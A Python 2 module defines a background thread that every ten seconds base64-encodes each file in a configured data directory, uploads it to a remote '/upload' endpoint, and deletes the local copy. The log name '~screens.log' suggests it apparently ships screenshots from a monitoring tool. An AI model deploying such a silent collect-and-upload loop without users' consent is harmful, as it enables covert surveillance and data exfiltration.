# -*- coding: utf-8 -*-

import os, sys
import threading
import base64
import defines
import urllib2
import time
import logger
import config

log = None

class Uploader(threading.Thread):
    def __init__(self, selfdir):
        threading.Thread.__init__(self)
        self.daemon = False
        self.active = False
        self.selfdir = selfdir
        self.datadir = os.path.expandvars(config.DATADIR)        
        self.url = config.URL + '/upload'
        global log
        log = logger.Logger(os.path.join(self.datadir, 'logs/~screens.log'), 'uploader')
        
        defines.makedirs(self.datadir)
        
        
    def run(self):
        self.active = True
        while self.active:
            try:
                defines.makedirs(self.datadir)
                for fn in [f for f in defines.rListFiles(self.datadir) if not os.path.basename(f).startswith('~')]:
                    self.upload(fn)
                    os.unlink(fn)
            except Exception as e:
                log.exception(e)
            
            time.sleep(10)
            
            
    def stop(self):
        self.active = False
    
    
    def upload(self, fn):        
        with open(fn, 'rb') as fp:
            filename = urllib2.quote(fn.replace(self.datadir, '').replace('\\','/'))[1:]            
            defines.GET(self.url, post="data={0}&filename={1}".format(base64.urlsafe_b64encode(fp.read()), filename))
        
            
            
if __name__ == "__main__":    
    selfdir = os.path.abspath(os.path.dirname(__file__))
    Uploader(selfdir).start()
#     for f in defines.rListFiles(selfdir):
#         log.debug(f)
#     print Uploader(selfdir).rgetFiles(selfdir)
    
    
    
        
        
        

        